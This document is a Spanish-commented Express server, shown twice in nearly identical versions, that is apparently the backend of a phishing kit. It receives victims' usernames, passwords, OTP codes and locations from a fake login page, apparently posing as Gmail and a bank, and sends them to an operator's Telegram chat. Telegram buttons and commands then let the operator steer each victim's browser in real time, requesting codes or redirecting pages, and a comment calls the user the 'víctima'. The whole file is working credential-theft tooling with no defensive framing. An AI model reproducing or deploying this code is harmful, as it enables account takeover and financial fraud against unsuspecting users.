const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// Limpieza automática cada 10 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.birthtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (!data.creadoEn) {
    data.creadoEn = Date.now();
  }
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// === ENVÍO INICIAL (contraseña) ===
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad, countrycode } = req.body;

  console.log(`📥 Datos recibidos: txid=${txid}, usuario=${usar}`);

  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}, ${countrycode}
`;

  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CONFIRMAR", callback_data: `confirm:${txid}` },
        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });

  res.sendStatus(200);
});

// === ENVÍO CON OTP (si usas /enviar3) ===
app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
  const mensaje = `
🔑🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🔑 0TP: <code>${dinamic}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

// === WEBHOOK DE TELEGRAM ===
app.post('/webhook', async (req, res) => {
  console.log("Webhook recibido");

  // Comandos de texto: /txid 22 o /redir txid pagina.html
  if (req.body.message?.text?.startsWith('/')) {
    const commandParts = req.body.message.text.slice(1).trim().split(' ');
    const primerArg = commandParts[0];

    // Comando /txid 22 (víctima ingresa código)
    if (/^[a-zA-Z0-9]{8}$/.test(primerArg)) {
      const txid = primerArg;
      const codigoStr = commandParts[1]?.trim();

      if (!codigoStr || !/^\d{2}$/.test(codigoStr)) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: req.body.message.chat.id,
            text: `⚠️ Formato inválido.\nUsa: /${txid} NN\nEjemplo: /${txid} 25`
          })
        });
        return res.sendStatus(200);
      }

      const cliente = cargarCliente(txid) || { status: 'esperando' };
      cliente.codigo = codigoStr;
      cliente.status = 'codigo_ingresado';
      guardarCliente(txid, cliente);

      console.log(`Código ${codigoStr} guardado para ${txid}`);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `✅ Código recibido: ${codigoStr}`
        })
      });
      return res.sendStatus(200);
    }

    // Comando /redir txid pagina.html
    if (primerArg === 'redir' && commandParts.length >= 3) {
      const txid = commandParts[1];
      const paginaDestino = commandParts.slice(2).join(' ');

      const cliente = cargarCliente(txid);
      if (!cliente) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: req.body.message.chat.id,
            text: `❌ txid no encontrado: ${txid}`
          })
        });
        return res.sendStatus(200);
      }

      cliente.redir_a = paginaDestino;
      cliente.status = 'redirigiendo';
      guardarCliente(txid, cliente);

      console.log(`Redirección programada a ${paginaDestino} para ${txid}`);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `✅ Redirigiendo a ${paginaDestino}`
        })
      });
      return res.sendStatus(200);
    }
  }

  // Botones inline
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    console.log(`🔴 Botón presionado: ${accion} - txid: ${txid}`);

    const cliente = cargarCliente(txid);
    if (!cliente) {
      console.log(`❌ Cliente no encontrado para txid: ${txid}`);
      res.sendStatus(200);
      return;
    }

    if (accion === 'confirm') {
      cliente.status = 'en_otro4';
      console.log(`✅ Status cambiado a 'en_otro4' para ${txid}`);
    } else if (accion === 'errorlogo') {
      cliente.status = 'en_index2';
      console.log(`✅ Status cambiado a 'en_index2' para ${txid}`);
    } else if (accion === 'cel-dina') {
      cliente.status = 'codigo_dinamico';
    } else if (accion === 'codigo_menu') {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `🔢 Envía el código de 2 dígitos para ${txid}\nEjemplo: /${txid} 25`
        })
      });
    }

    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: "Acción ejecutada"
      })
    });
    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// === ESTADO PARA EL FRONTEND ===
app.get('/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) {
    return res.status(400).json({ error: 'Falta txid' });
  }
  const cliente = cargarCliente(txid) || { status: 'esperando' };
  res.json({
    status: cliente.status || 'esperando',
    codigo: cliente.codigo || null,
    redir_a: cliente.redir_a || null
  });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
const fs = require('fs');
const path = require('path');
require('dotenv').config();

const app = express();
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const CLIENTES_DIR = './clientes';

if (!fs.existsSync(CLIENTES_DIR)) {
  fs.mkdirSync(CLIENTES_DIR);
}

// Limpieza automática cada 10 minutos: borra clientes con más de 15 minutos
setInterval(() => {
  const files = fs.readdirSync(CLIENTES_DIR);
  const ahora = Date.now();
  files.forEach(file => {
    const fullPath = path.join(CLIENTES_DIR, file);
    const stats = fs.statSync(fullPath);
    const edadMinutos = (ahora - stats.birthtimeMs) / 60000;
    if (edadMinutos > 15) {
      fs.unlinkSync(fullPath);
      console.log(`🗑️ Eliminado: ${file} (${Math.round(edadMinutos)} min)`);
    }
  });
}, 10 * 60 * 1000);

function guardarCliente(txid, data) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (!data.creadoEn) {
    data.creadoEn = Date.now();
  }
  fs.writeFileSync(ruta, JSON.stringify(data, null, 2));
}

function cargarCliente(txid) {
  const ruta = `${CLIENTES_DIR}/${txid}.json`;
  if (fs.existsSync(ruta)) {
    return JSON.parse(fs.readFileSync(ruta));
  }
  return null;
}

// === ENVÍO INICIAL (contraseña) ===
app.post('/enviar', async (req, res) => {
  const { usar, clavv, txid, ip, ciudad, countrycode } = req.body;
  const mensaje = `
🔵GM4YL🔵
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}, ${countrycode}
`;
  const cliente = {
    status: "esperando",
    usar,
    clavv,
    ip,
    ciudad
  };
  guardarCliente(txid, cliente);

  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CONFIRMAR", callback_data: `confirm:${txid}` },
        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

// === ENVÍO CON CÓDIGO DINÁMICO (OTP) ===
app.post('/enviar3', async (req, res) => {
  const { usar, clavv, txid, dinamic, ip, ciudad } = req.body;
  const mensaje = `
🔑🟢B4N3SC0🟢
🆔 ID: <code>${txid}</code>
📱 US4R: <code>${usar}</code>
🔐 CL4V: <code>${clavv}</code>
🔑 0TP: <code>${dinamic}</code>
🌐 IP: ${ip}
🏙️ Ciudad: ${ciudad}
`;
  const keyboard = {
    inline_keyboard: [
      [
        { text: "🔑 CÓDIGO", callback_data: `cel-dina:${txid}` },
        { text: "🔢 INGRESAR CÓDIGO", callback_data: `codigo_menu:${txid}` },
        { text: "❌ ERROR LOGO", callback_data: `errorlogo:${txid}` }
      ]
    ]
  };

  const cliente = cargarCliente(txid) || {};
  cliente.status = "esperando";
  guardarCliente(txid, cliente);

  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      chat_id: CHAT_ID,
      text: mensaje,
      parse_mode: 'HTML',
      reply_markup: keyboard
    })
  });
  res.sendStatus(200);
});

// === WEBHOOK DE TELEGRAM ===
app.post('/webhook', async (req, res) => {
  // === COMANDOS DE TEXTO ===
  if (req.body.message?.text?.startsWith('/')) {
    const commandParts = req.body.message.text.slice(1).trim().split(' ');
    const primerArg = commandParts[0];

    // 1. Comando /txid 22 (víctima ingresa código)
    if (/^[a-zA-Z0-9]{8}$/.test(primerArg)) {
      const txid = primerArg;
      const codigoStr = commandParts[1]?.trim();

      if (!codigoStr || !/^\d{2}$/.test(codigoStr)) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: req.body.message.chat.id,
            text: `⚠️ Formato inválido.\nUsa: /${txid} NN\nEjemplo: /${txid} 25`
          })
        });
        return res.sendStatus(200);
      }

      const cliente = cargarCliente(txid) || { status: 'esperando' };
      cliente.codigo = codigoStr;
      cliente.status = 'codigo_ingresado';
      guardarCliente(txid, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `✅ Código recibido: ${codigoStr} para ${txid}`
        })
      });
      return res.sendStatus(200);
    }

    // 2. Comando /redir txid pagina.html
    if (primerArg === 'redir' && commandParts.length >= 3) {
      const txid = commandParts[1];
      const paginaDestino = commandParts.slice(2).join(' ');

      const cliente = cargarCliente(txid);
      if (!cliente) {
        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: req.body.message.chat.id,
            text: `❌ txid no encontrado: ${txid}`
          })
        });
        return res.sendStatus(200);
      }

      cliente.redir_a = paginaDestino;
      cliente.status = 'redirigiendo';
      guardarCliente(txid, cliente);

      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: req.body.message.chat.id,
          text: `✅ Redirección activada para ${txid}\n➡️ Página: ${paginaDestino}`
        })
      });
      return res.sendStatus(200);
    }

    // Comando desconocido
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: req.body.message.chat.id,
        text: `ℹ️ Comandos:\n/txid 22 → ingresar código\n/redir txid pagina.html → redirigir`
      })
    });
    return res.sendStatus(200);
  }

  // === BOTONES INLINE ===
  if (req.body.callback_query) {
    const callback = req.body.callback_query;
    const partes = callback.data.split(":");
    const accion = partes[0];
    const txid = partes[1];

    const cliente = cargarCliente(txid) || { status: 'esperando' };

    if (accion === 'confirm') {
      cliente.status = 'en_otro4';  // Evita bucle al llegar a otro4.html
    } else if (accion === 'errorlogo') {
      cliente.status = 'en_index2';
    } else if (accion === 'cel-dina') {
      cliente.status = 'codigo_dinamico';
    } else if (accion === 'codigo_menu') {
      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: callback.message.chat.id,
          text: `🔢 Envía el código de 2 dígitos para ${txid}\nEjemplo: /${txid} 25`
        })
      });
    }

    guardarCliente(txid, cliente);

    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/answerCallbackQuery`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        callback_query_id: callback.id,
        text: "Acción ejecutada"
      })
    });
    return res.sendStatus(200);
  }

  res.sendStatus(200);
});

// === ESTADO PARA EL FRONTEND ===
app.get('/status', (req, res) => {
  const txid = req.query.txid;
  if (!txid) {
    return res.status(400).json({ error: 'Falta txid' });
  }
  const cliente = cargarCliente(txid) || { status: 'esperando' };
  res.json({
    status: cliente.status || 'esperando',
    codigo: cliente.codigo || null,
    redir_a: cliente.redir_a || null
  });
});

app.get('/', (req, res) => res.send("Servidor activo en Render"));

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Servidor activo en puerto ${PORT}`));
